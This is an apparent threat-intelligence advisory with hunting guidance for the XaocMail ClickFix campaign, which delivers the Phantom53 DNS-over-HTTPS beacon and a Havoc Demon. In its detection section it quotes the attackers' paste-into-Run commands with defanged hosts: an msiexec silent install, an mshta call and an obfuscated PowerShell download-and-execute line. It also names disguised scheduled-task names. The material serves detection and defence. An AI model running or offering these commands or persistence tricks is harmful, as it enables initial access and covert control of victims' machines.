What to do

  1. Block the attacker IPs, domains (each workers.dev host exactly as listed), the exfiltration URL on 145[.]63[.]138[.]67:8125 and all Phantom53 and Havoc hashes, and search 90 days of proxy, DNS, firewall and EDR logs for them.
  2. Alert on msiexec, mshta or PowerShell launched from the Run dialog with a workers.dev URL ending in /m?id=, /h?id= or /s?id=; isolate any host that hits.
  3. Hunt scheduled tasks that run pythonw.exe with a .pyw script from AppData, the files p53_task_a.xml or p53_task_b.xml, and pythonw.exe in AppData talking to DoH resolvers.
  4. On a confirmed host, remove both tasks and the random AppData Python folder, check HKCU\Software\Classes\CLSID for the beacon's state key, and reset the user's passwords and sessions.
  5. Reduce ClickFix risk: restrict the Run dialog and msiexec from URLs for standard users, and warn staff about paste-this-command pages behind document-sharing emails.

Behaviours to hunt 4

Behaviours are leads, not confirmed indicators, and can match legitimate activity. Compare any hit against your own baseline and environment before acting.

  1. 1

    alert ClickFix Run-dialog msiexec, mshta or PowerShell from workers.dev

    Look formsiexec, mshta or PowerShell started from the Run dialog (explorer.exe) with a workers.dev URL ending in /m?id=, /h?id= or /s?id=, or the reversed 'xei' Invoke-Expression trick

    Why it mattersThe XaocMail ClickFix page tells the victim to paste a command into Win+R: msiexec /i hxxps://securedoc[.][name][.]workers[.]dev/m?id=[id] /qn (the current, preferred mode), mshta hxxps://[.][.][.]/h?id=, or powershell .(-join'xei'[-1..-3])((New-Object Net.WebClient).DownloadString('hxxps://[.][.][.]/s?id=')). Tuning: parent must be explorer.exe, the child msiexec, mshta, powershell or pwsh, and the command line must carry a workers.dev URL with one of the three payload paths and an id= parameter, or the reversed xei string. Expected false positives: very rare; legitimate installers are not launched by hand from a workers.dev URL. Treat any hit as initial access. SOCRadar

  2. 2

    alert Scheduled task running pythonw.exe from AppData

    Look forA scheduled task that runs pythonw.exe with a .pyw script from a randomly named folder under AppData

    Why it mattersThe Phantom53 MSI drops a private Python 3.11 runtime into a random folder under %LOCALAPPDATA%, %APPDATA%, %APPDATA%\Microsoft or %LOCALAPPDATA%\Microsoft\WindowsApps and registers two tasks that run [folder]\pythonw.exe [random].pyw every 12 minutes (beacon) and every 3 minutes (watcher). Task names come from a pool: MicrosoftEdgeUpdateTask, OneDriveSyncTask, WindowsDefenderScheduledScan, OfficeBackgroundTaskHandler or AdobeAcrobatUpdateTask followed by one random character. Tuning: the task action must contain pythonw.exe and a .pyw file under AppData; standard Python installs (\Programs\Python\, Microsoft Store PythonSoftwareFoundation, Anaconda or Miniconda) are excluded. Expected false positives: a developer's own scheduled Python script run from a portable or venv folder in AppData; a task name from the pool with a pythonw.exe action is close to certain. SOCRadar

    hunt pythonw.exe in AppData using DoH resolvers

    Look forpythonw.exe running from a user AppData folder making DNS-over-HTTPS requests to public resolvers by IP or by dns.google

    Why it mattersThe Phantom53 beacon hides its command and control in DNS AAAA answers fetched by DoH POST to 1[.]1[.]1[.]1, 1[.]0[.]0[.]1, 8[.]8[.]8[.]8, 8[.]8[.]4[.]4, 76[.]76[.]2[.]11 or 76[.]76[.]10[.]11 on port 443, falling back to SNI hosts such as dns.google and then to plain UDP 53. Tuning: the process must be pythonw.exe under AppData, outside standard Python installs (\Programs\Python\, PythonSoftwareFoundation, Anaconda, Miniconda). Expected false positives: a Python tool in a user profile that uses a DoH library; browsers and the OS resolver are not pythonw.exe. Do not block the resolvers; hunt the process. SOCRadar

Background

SOCRadar's Threat Research Unit, writing on 13 November 2026, describes an active campaign by a Russian-speaking actor running since August 2026. XaocMail, a self-hosted phishing platform, sends personalised document-sharing emails from likely compromised mailboxes, linking to Cloudflare Worker ClickFix pages (securedoc subdomains on workers.dev). The victim pastes a Win+R command that runs an MSI (msiexec /i ... /qn), HTA or PowerShell payload. The MSI drops a private Python runtime in a random AppData folder and two scheduled tasks that run pythonw.exe: the Phantom53 beacon, which hides command and control in DNS-over-HTTPS AAAA answers from Cloudflare, Google and ControlD resolvers, and a watcher that loads a Havoc Demon in memory for chosen targets. Almost a thousand lures hit Latin America, Asia and Europe across technology, finance, education, government, logistics and manufacturing. Attacker servers, domains, the exfiltration URL and all malware hashes are on the block list.
